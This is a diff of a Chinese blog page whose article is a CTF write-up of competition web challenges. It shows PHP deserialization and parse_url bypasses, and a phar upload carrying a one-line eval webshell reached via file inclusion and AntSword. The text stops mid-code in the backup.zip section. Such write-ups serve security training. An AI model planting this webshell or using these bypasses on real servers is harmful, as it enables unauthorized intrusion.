@@ -1,188 +1,248 @@
+
+
 <!DOCTYPE html>
-<html lang=zh>
+<html lang="zh-CN" data-default-color-scheme=&#34;dark&#34;>
+
+
+
 <head>
-    <!-- so meta -->
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="前言划水+1,激情复现 JustSosoindex.php文件中使用parse_url对解析url中是否存在Flag，使用&#x2F;&#x2F;&#x2F;可绕过具体可参考：http:&#x2F;&#x2F;www.am0s.com&#x2F;functions&#x2F;406.html hint.php反序列化会先调用__wakeup()使得对象属性为NULL，绕过具体参考：https:&#x2F;&#x2F;mochazz.github.io&#x2F;2018&#x2F;12&#x2F;30&#x2F;PHP%E5">
-<meta property="og:type" content="article">
-<meta property="og:title" content="第12届全国大学生信息安全竞赛_WEB">
-<meta property="og:url" content="http://zhzhdoai.github.io/2019/04/25/%E7%AC%AC12%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-WEB/index.html">
-<meta property="og:site_name" content="osword&#39;s blog">
-<meta property="og:description" content="前言划水+1,激情复现 JustSosoindex.php文件中使用parse_url对解析url中是否存在Flag，使用&#x2F;&#x2F;&#x2F;可绕过具体可参考：http:&#x2F;&#x2F;www.am0s.com&#x2F;functions&#x2F;406.html hint.php反序列化会先调用__wakeup()使得对象属性为NULL，绕过具体参考：https:&#x2F;&#x2F;mochazz.github.io&#x2F;2018&#x2F;12&#x2F;30&#x2F;PHP%E5">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/04/25/%E7%AC%AC12%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-WEB/1.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/04/25/%E7%AC%AC12%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-WEB/2.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/04/25/%E7%AC%AC12%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-WEB/3.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/04/25/%E7%AC%AC12%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-WEB/4.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/04/25/%E7%AC%AC12%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-WEB/5.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/04/25/%E7%AC%AC12%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-WEB/6.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/04/25/%E7%AC%AC12%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-WEB/7.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/04/25/%E7%AC%AC12%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-WEB/8.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/04/25/%E7%AC%AC12%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-WEB/9.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/04/25/%E7%AC%AC12%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-WEB/10.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/04/25/%E7%AC%AC12%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-WEB/11.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/04/25/%E7%AC%AC12%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-WEB/12.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/04/25/%E7%AC%AC12%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-WEB/13.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/04/25/%E7%AC%AC12%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-WEB/14.png">
-<meta property="article:published_time" content="2019-04-25T11:53:34.000Z">
-<meta property="article:modified_time" content="2020-05-15T08:30:32.000Z">
-<meta property="article:author" content="osword">
-<meta property="article:tag" content="CTF">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://zhzhdoai.github.io/2019/04/25/%E7%AC%AC12%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-WEB/1.png">
-    
-    
-        
-          
-              <link rel="shortcut icon" href="/images/favicon.ico">
-          
-        
-        
-          
-            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
-          
-        
-        
-          
-            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
-          
-        
-    
-    <!-- title -->
-    <title>第12届全国大学生信息安全竞赛_WEB</title>
-    <!-- styles -->
-    
-<link rel="stylesheet" href="/css/style.css">
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="osword">
+  <meta name="keywords" content="">
+  <title>第12届全国大学生信息安全竞赛_WEB - osword&#39;s blog</title>
 
-    <!-- persian styles -->
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
     
       
-<link rel="stylesheet" href="/css/rtl.css">
-
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/darcula.min.css" />
     
-    <!-- rss -->
-    
-    
-      <link rel="alternate" href="/true" title="osword&#39;s blog" type="application/atom+xml" />
-    
-<meta name="generator" content="Hexo 4.2.1"></head>
-
-<body class="max-width mx-auto px3 ltr">
-    
-      <div id="header-post">
-  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
-  <span id="menu">
-    <span id="nav">
-      <ul>
-         
-          <li><a href="/">首页</a></li>
-         
-          <li><a href="/about/">关于</a></li>
-         
-          <li><a href="/archives/">归档</a></li>
-         
-          <li><a href="/projects_url">项目</a></li>
-        
-      </ul>
-    </span>
-    <br/>
-    <span id="actions">
-      <ul>
-        
-        <li><a class="icon" href="/2019/04/28/fafuCtf-WEB%E9%A2%98%E8%A7%A3/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
-        
-        
-        <li><a class="icon" href="/2019/04/25/HDwiki6-0-sql%E7%9B%B2%E6%B3%A8/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
-        
-        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
-      </ul>
-      <span id="i-prev" class="info" style="display:none;">上一篇</span>
-      <span id="i-next" class="info" style="display:none;">下一篇</span>
-      <span id="i-top" class="info" style="display:none;">返回顶部</span>
-      <span id="i-share" class="info" style="display:none;">分享文章</span>
-    </span>
-    <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zhzhdoai.github.io/2019/04/25/%E7%AC%AC12%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-WEB/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://zhzhdoai.github.io/2019/04/25/%E7%AC%AC12%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-WEB/&text=第12届全国大学生信息安全竞赛_WEB" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zhzhdoai.github.io/2019/04/25/%E7%AC%AC12%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-WEB/&title=第12届全国大学生信息安全竞赛_WEB" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zhzhdoai.github.io/2019/04/25/%E7%AC%AC12%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-WEB/&is_video=false&description=第12届全国大学生信息安全竞赛_WEB" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=第12届全国大学生信息安全竞赛_WEB&body=Check out this article: http://zhzhdoai.github.io/2019/04/25/%E7%AC%AC12%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-WEB/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://zhzhdoai.github.io/2019/04/25/%E7%AC%AC12%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-WEB/&title=第12届全国大学生信息安全竞赛_WEB" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://zhzhdoai.github.io/2019/04/25/%E7%AC%AC12%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-WEB/&title=第12届全国大学生信息安全竞赛_WEB" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zhzhdoai.github.io/2019/04/25/%E7%AC%AC12%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-WEB/&title=第12届全国大学生信息安全竞赛_WEB" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://zhzhdoai.github.io/2019/04/25/%E7%AC%AC12%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-WEB/&title=第12届全国大学生信息安全竞赛_WEB" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zhzhdoai.github.io/2019/04/25/%E7%AC%AC12%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-WEB/&name=第12届全国大学生信息安全竞赛_WEB&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://zhzhdoai.github.io/2019/04/25/%E7%AC%AC12%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-WEB/&t=第12届全国大学生信息安全竞赛_WEB" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-    <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JustSoso"><span class="toc-number">2.</span> <span class="toc-text">JustSoso</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RefSpace"><span class="toc-number">3.</span> <span class="toc-text">RefSpace</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#信息搜集"><span class="toc-number">3.1.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Up10aD-php"><span class="toc-number">3.2.</span> <span class="toc-text">Up10aD.php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phar一句话木马构造"><span class="toc-number">3.3.</span> <span class="toc-text">phar一句话木马构造</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#backup-zip中文件"><span class="toc-number">3.4.</span> <span class="toc-text">backup.zip中文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag-php"><span class="toc-number">3.5.</span> <span class="toc-text">flag.php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP-SDK使用例子："><span class="toc-number">3.6.</span> <span class="toc-text">PHP SDK使用例子：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#refelect-namespace"><span class="toc-number">3.7.</span> <span class="toc-text">refelect namespace</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DEMO实验"><span class="toc-number">3.8.</span> <span class="toc-text">DEMO实验</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#世界上最简单的sql"><span class="toc-number">4.</span> <span class="toc-text">世界上最简单的sql</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#DOUBLE型溢出"><span class="toc-number">4.1.</span> <span class="toc-text">DOUBLE型溢出</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload"><span class="toc-number">4.2.</span> <span class="toc-text">payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#无列名取值"><span class="toc-number">4.3.</span> <span class="toc-text">无列名取值</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#love-math"><span class="toc-number">5.</span> <span class="toc-text">love_math</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考链接"><span class="toc-number">6.</span> <span class="toc-text">参考链接</span></a></li></ol>
-    </div>
-  </span>
-</div>
-
-    
-    <div class="content index py4">
-        
-        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
-  <header>
-    
-    <h1 class="posttitle" itemprop="name headline">
-        第12届全国大学生信息安全竞赛_WEB
-    </h1>
-
-
-
-    <div class="meta">
-      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
-        <span itemprop="name">osword's blog</span>
-      </span>
-      
-    <div class="postdate">
-      
-        <time datetime="2019-04-25T11:53:34.000Z" itemprop="datePublished">2019-04-25</time>
-        
-      
-    </div>
-
-
-      
-
-      
-    <div class="article-tag">
-        <i class="fas fa-tag"></i>
-        <a class="tag-link" href="/tags/CTF/" rel="tag">CTF</a>
-    </div>
-
-
-      <span id="/2019/04/25/%E7%AC%AC12%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-WEB/" class="leancloud_visitors" data-flag-title="第12届全国大学生信息安全竞赛_WEB">
-    <em class="post-meta-item-text">阅读量 </em>
-    <i class="leancloud-visitors-count" data-index="/2019/04/25/%E7%AC%AC12%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-WEB/"></span>
-    </div>
-
-  </header>
   
 
-  <div class="content" itemprop="articleBody">
-    <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>划水+1,激情复现</p>
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_pf9vaxs7x7b.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2019-04-25 19:53" pubdate>
+        2019年4月25日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.1k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      14
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">第12届全国大学生信息安全竞赛_WEB</h1>
+            
+            <div class="markdown-body" id="post-body">
+              <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>划水+1,激情复现</p>
 <h1 id="JustSoso"><a href="#JustSoso" class="headerlink" title="JustSoso"></a>JustSoso</h1><p><strong>index.php</strong>文件中使用<code>parse_url</code>对解析url中是否存在Flag，使用<code>///</code>可绕过具体可参考：<a href="http://www.am0s.com/functions/406.html" target="_blank" rel="noopener">http://www.am0s.com/functions/406.html</a></p>
 <p><strong>hint.php</strong>反序列化会先调用<code>__wakeup()</code>使得对象属性为NULL，绕过具体参考：<a href="https://mochazz.github.io/2018/12/30/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96bug/" target="_blank" rel="noopener">https://mochazz.github.io/2018/12/30/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96bug/</a> </p>
-<p><img src="./1.png" alt=""></p>
+<p><img src="./1.png" srcset="/img/loading.gif" alt=""></p>
 <p>token_flag由于每执行一次getFLag使得与token值不等。</p>
 <p>借用PHP变量引用，$this-&gt;token = &amp;$this-&gt;token_flag;即可绕过===判断<br>参考链接：<a href="https://blog.csdn.net/heiyeshuwu/article/details/748935" target="_blank" rel="noopener">https://blog.csdn.net/heiyeshuwu/article/details/748935</a></p>
 <p>接着构造序列化。注意反序列化private特性生成的<code>\0</code><br>全程使用<code>python</code>进行解题，或者也可以手动添加<code>\0</code></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">$f= <span class="keyword">new</span> Flag(<span class="string">"flag.php"</span>);</span><br><span class="line">$f-&gt;token=&amp;$f-&gt;token_flag;</span><br><span class="line">$h= <span class="keyword">new</span> Handle($f);</span><br><span class="line">$h=serialize($h);</span><br><span class="line">var_dump($h);</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs php">...
+$f= <span class="hljs-keyword">new</span> Flag(<span class="hljs-string">"flag.php"</span>);
+$f-&gt;token=&amp;$f-&gt;token_flag;
+$h= <span class="hljs-keyword">new</span> Handle($f);
+$h=serialize($h);
+var_dump($h);</code></pre>
 
-<p>puython脚本运行结果如下<br><img src="./2.png" alt=""><br><img src="./3.png" alt=""></p>
+<p>puython脚本运行结果如下<br><img src="./2.png" srcset="/img/loading.gif" alt=""><br><img src="./3.png" srcset="/img/loading.gif" alt=""></p>
 <h1 id="RefSpace"><a href="#RefSpace" class="headerlink" title="RefSpace"></a>RefSpace</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><ol>
 <li>robots.txt得到文件上传路径</li>
 <li>构造路径其他路径包含，发现弹出可疑路径/ctf/</li>
@@ -190,197 +250,326 @@
 <li>伪协议读取index.php、、flag.php</li>
 </ol>
 <p>考点<code>refelect namespace</code>：<a href="https://php.net/manual/zh/language.namespaces.php" target="_blank" rel="noopener">https://php.net/manual/zh/language.namespaces.php</a></p>
-<h2 id="Up10aD-php"><a href="#Up10aD-php" class="headerlink" title="Up10aD.php"></a>Up10aD.php</h2><p><img src="./4.png" alt=""></p>
-<h2 id="phar一句话木马构造"><a href="#phar一句话木马构造" class="headerlink" title="phar一句话木马构造"></a>phar一句话木马构造</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">phar.php</span><br><span class="line">$p=<span class="keyword">new</span> PharData(dirname(<span class="keyword">__FILE__</span>).’/phartest.zip’,<span class="number">0</span>,’phartest’,Phar::ZIP);</span><br><span class="line">$x=file_get_content(‘./test.php’);</span><br><span class="line">$p-&gt;addFromString(‘test.php’,$x);</span><br><span class="line"><span class="comment">//文件重命名为phartest</span></span><br><span class="line"></span><br><span class="line">test.php</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_GET[‘mima’]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="./5.png" alt=""></p>
+<h2 id="Up10aD-php"><a href="#Up10aD-php" class="headerlink" title="Up10aD.php"></a>Up10aD.php</h2><p><img src="./4.png" srcset="/img/loading.gif" alt=""></p>
+<h2 id="phar一句话木马构造"><a href="#phar一句话木马构造" class="headerlink" title="phar一句话木马构造"></a>phar一句话木马构造</h2><pre><code class="hljs php">phar.php
+$p=<span class="hljs-keyword">new</span> PharData(dirname(<span class="hljs-keyword">__FILE__</span>).’/phartest.zip’,<span class="hljs-number">0</span>,’phartest’,Phar::ZIP);
+$x=file_get_content(‘./test.php’);
+$p-&gt;addFromString(‘test.php’,$x);
+<span class="hljs-comment">//文件重命名为phartest</span>
+
+test.php
+<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>($_GET[‘mima’]); <span class="hljs-meta">?&gt;</span></code></pre>
+<p><img src="./5.png" srcset="/img/loading.gif" alt=""></p>
 <p>使用上述方法借助<strong>app/Up10aD.php</strong>上传phar包，利用<strong>app/index.php</strong>文件包含，蚁剑连接<code>http://xxxx?route=phar://phartest.jpg/test</code></p>
-<p><img src="./6.png" alt=""></p>
-<h2 id="backup-zip中文件"><a href="#backup-zip中文件" class="headerlink" title="backup.zip中文件"></a>backup.zip中文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">我们的SDK通过如下SHA1算法验证key是否正确:</span><br><span class="line"></span><br><span class="line">public function verify($key)</span><br><span class="line">&#123;</span><br><span class="line">    if (sha1($key) &#x3D;&#x3D;&#x3D; $this-&gt;getHash()) &#123;</span><br><span class="line">        return 